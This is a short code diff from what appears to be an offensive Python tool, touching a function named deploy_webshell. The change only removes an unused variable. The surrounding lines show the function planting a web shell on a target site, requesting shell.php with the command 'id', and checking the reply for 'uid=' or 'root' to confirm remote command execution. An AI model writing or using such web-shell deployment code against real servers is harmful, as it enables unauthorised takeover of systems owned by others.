@@ -115,7 +115,7 @@ def deploy_webshell(target_url: str, webshell_type: str = "php_cmd",
     if sess is None:
         sess = requests.Session()
     try:
-        r = sess.get(deploy_methods[0][1], timeout=timeout)
+        sess.get(deploy_methods[0][1], timeout=timeout)
         shell_url = target_url.rstrip("/?&") + "/shell.php"
         r2 = sess.get(shell_url + "?c=id", timeout=timeout)
         if r2.status_code == 200 and ("uid=" in r2.text or "root" in r2.text.lower()):
